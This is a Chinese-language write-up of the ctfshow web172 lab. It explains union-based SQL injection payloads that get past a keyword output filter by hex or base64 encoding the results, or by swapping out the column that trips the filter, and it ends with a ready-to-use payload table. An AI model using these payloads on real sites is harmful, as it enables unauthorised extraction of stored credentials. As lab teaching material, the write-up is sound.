## 一句话概括

页面把 `flag` 关键字拉黑，导致**要查的那列数据自带 `flag` 字样，一显示就被拦**。办法有两个：要么把结果**编码**成 hex/base64（页面看到的是乱码，拦截规则匹配不到），要么**换一列输出**，把带 `flag` 字的列踢出去。

## 被过滤的东西 → 绕过手法对照表

| 被过滤的东西 | 问题 | 绕过手法 |
|---|---|---|
| `flag` 关键字 | 输出的用户名正好叫 `flag` | `hex(列名)` / `to_base64(列名)` 编码后再输出 |
| `flag` 关键字 | 只要某一列含 flag 就被拦 | 只 select 不含 flag 的列（把 `username` 换成 `id`） |

## 本题情景与解题手法：web172（编码绕过）

### 题目形态

注入点和 web171 一样，URL 是 `id` 参数。后端 SQL：

```php
$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

返回前多了一层 WAF：

```php
if (!preg_match('/flag/i', json_encode($ret))) {
    $ret['msg'] = '查询成功';       // 只有在回显里搜不到 flag 时才提示成功
}
```

`/flag/i` 不区分大小写，所以 `flag`、`Flag`、`FLAG` 都会被命中。

### 第一步：直接 union 会被拦

```sql
-1' union select username,password from ctfshow_user2 --+
```

问题在于：`ctfshow_user2` 里那个目标用户的 **`username` 字段本身就写着 `flag` 这四个字母**，即使密码拿到了，回显里也会出现 `flag` 字面量，被 `/flag/i` 拦下。

### 第二步：把返回值编码

只要让**回显里不出现 `flag` 这个字面量**就行。SQL 提供两个现成的编码函数：

| 函数 | 效果 |
|---|---|
| `hex(x)` | 转成十六进制字符串 |
| `to_base64(x)` | 转成 base64 字符串 |

按原文的说法，"思路为将返回值编码，可编码为 base64 或十六进制"。

### 第三步：hex 版本

```sql
-1' union select hex(username),hex(password) from ctfshow_user2 --+
```

回显变成：

```text
666C6167...      ← 这是 flag 的 hex，页面上没有 "flag" 字样，WAF 放行
```

### 第四步：base64 版本

```sql
-1' union select to_base64(username),to_base64(password) from ctfshow_user2 --+
```

拿到一串 base64，本地解码还原明文。

### 错误示范

```sql
-1' union select hex('flag'),2 from ctfshow_user2 --+
```

这条**输出的是字符串 `flag` 的编码**（`666c6167`），而不是数据库里那一行的编码。两个原因：

1. `'flag'` 加了引号 → 被识别成**字符串字面量**，而不是列名；
2. 括号里本来就应该是**列名**。

正确的引用形式是：

```sql
union select 列1,列2 from 表名
```

即 `hex(username)`、`hex(password)` 这种把**列**包进函数里的写法。

### 注入手法一句话总结

> **回显被「关键字黑名单」卡住时，用 `hex()` / `to_base64()` 把结果编码再输出，页面匹配不到关键字即可放行，本地解码还原。**

## 本题情景与解题手法：web172（另解 —— 只输出无过滤内容）

### 思路

编解码不是唯一出路。既然被拦的原因是「输出的那一列带着 `flag` 字」，那就**不要输出那一列**。

### 做法：把显示用户名的地方换成 id

```sql
999' union select id, password from ctfshow_user2 where username = 'flag
```

- 第一个回显位原本显示 `username`（值是 `flag`，会被拦），换成 `id`（一个数字，安全）；
- 第二个回显位保持 `password`（真正的 flag 内容，本身不含 `flag` 字样）。

这样回显里的两个值都不含 `flag`，直接通过。

等价的更简版本：

```sql
999' union select 1, password from ctfshow_user2 where username = 'flag
```

第一个字段直接填常量 `1` 占位，第二个字段输出密码。

> 原文的注解：**"除了将输出编码以外，当想要输出的内容里没有过滤字样时，可以只输出无过滤字样的内容。"** 另外「将 id 移到输出行，则原本显示用户名的地方显示为 id」，本质就是换一个不含敏感字样的列去占那个回显位。

### 注入手法一句话总结

> **输出被关键字过滤时，除了编码，还可以"换列"：把触发过滤的那一列从回显位拿掉，用其他列顶替。**

## Payload 速查

| 目的 | Payload |
|---|---|
| hex 编码全部列 | `-1' union select hex(username),hex(password) from ctfshow_user2 --+` |
| base64 编码全部列 | `-1' union select to_base64(username),to_base64(password) from ctfshow_user2 --+` |
| 只输出密码列 | `999' union select 1, password from ctfshow_user2 where username = 'flag` |
| 用 id 顶替用户名列 | `999' union select id, password from ctfshow_user2 where username = 'flag` |

## 踩坑与备注

- **`hex('flag')` 和 `hex(username)` 不是一回事**：前者编码"字符串 flag"，后者编码"该行 username 列的值"。括号里必须是列名。
- **原 SQL 的引号会被拼进去**：这道题的注入点是 `id = '".$_GET['id']."'`，双引号只是 PHP 的字符串定界符，最终进 SQL 的仍是单引号包裹，所以 payload 开头照常写 `-1'` 闭合。
- **`to_base64()` 是 MySQL 5.6+ 的函数**，旧版本可能不存在，此时用 `hex()` 更稳。
- **编码只躲过"字面匹配"**：如果 WAF 会解码后再查（少见），hex/base64 就会失效，需要回到"换列""盲注""写文件"这些思路。
- **判据是页面有没有出现 `查询成功`**：`!preg_match(...)` 为真时才打这句提示，所以看到它就说明回显里确实没有 `flag`。
